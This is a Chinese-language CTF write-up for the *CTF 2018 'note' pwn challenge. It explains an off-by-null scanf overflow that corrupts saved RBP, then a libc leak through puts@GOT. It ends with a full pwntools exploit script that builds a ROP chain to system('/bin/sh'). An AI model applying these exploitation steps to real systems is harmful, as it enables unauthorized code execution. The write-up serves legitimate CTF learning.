---
title: starctf note
date: 2018-9-28 00:00:00
categories:
- Pwn
tags: Pwn
---

## note

很神奇的一道offbynull栈题目

当时没做出来，后来赛后搞懂了忘记写wp，最近才拿出来复习下

漏洞点：

```c
char *edit()
{
  char s; // [rsp+0h][rbp-100h]

  _isoc99_scanf((__int64)"%256s", (__int64)&s);
  return strdup(&s);
}
```

scanf会多读一个\x00字节，这样就可以局部写RBP指针

写完之后的rbp：

```
$rsp   : 0x7fffffffd688      →  0x000000000040102c  →   add BYTE PTR [rax], al
$rbp   : 0x7fffffffdd68      →  0x00007fffffffde00  →  "xaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabea[...]"
```

找一下偏移

```
gef➤  pattern search xaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabea
[+] Searching 'xaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabea'
[+] Found at offset 184 (big-endian search) 
gef➤
```

之后我们要控制的栈变量是v6，存储的是一个%d，我们可以把它改成%256s

 

```
  const char *v3; // rax
  __int64 *v4; // [rsp-8h][rbp-28h]
  int v5; // [rsp+Ch][rbp-14h]
  const char *v6; // [rsp+10h][rbp-10h]
  char *v7; // [rsp+18h][rbp-8h]
  __int64 savedregs; // [rsp+20h][rbp+0h]
```

也就是在184 - 16 = 168偏移处我们写入%256s的地址

由于这个函数所有的重要参数都保存在栈上，这样下一次调用show的时候我们就可以将v7改写成我们想要泄露的地址

```
case 2:
        a2 = (char **)v7;                       // show
        printf("Note:%s\n", v7);
        break;
```

payload就形如这样

```
payload = p32(2) + p64(fmt) + p64(puts_got)
```

而后就是再一次利用栈溢出漏洞构造rop

exp：

~~~python
from pwn import *
context.log_level = 'debug'
io = process('./note')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
elf = ELF('note')
def p():
	gdb.attach(io)
	raw_input()
def choice(c):
	io.recvuntil('>')
	io.sendline(str(c))
def show():
	choice(2)
def edit(content):
	choice(1)
	io.recvuntil(':')
	io.sendline(content)
def save():
	choice(3)
def change_id(id):
	choice(4)
	io.recvuntil(':')
	io.sendline(id)
def main():
	puts_plt = elf.symbols['puts']
	puts_got = elf.got['puts']
	fmt = 0x401129
	pop_rdi_ret = 0x401003

```
io.recvuntil(':')
io.sendline('secunda')
payload = 'A'*168 + p64(fmt)
payload += 'A'*(256 - len(payload))

edit(payload)
gdb.attach(io)
io.recvuntil('>')

payload = p32(2) + p64(fmt) + p64(puts_got)

io.sendline(payload)
io.recvuntil('Note:')
leak = u64(io.recvline(keepends = False).ljust(8,'\x00'))
log.success(hex(leak))
libc_base = leak - libc.symbols['puts']
sys = libc_base + libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))
bin_sh += libc_base
payload = 'A'*100 + p64(pop_rdi_ret)+p64(bin_sh) + p64(sys)
#payload = cyclic(20)
io.recvuntil('> ')
io.sendline(payload)
io.interactive()
```

if __name__ == '__main__':
	main()
~~~

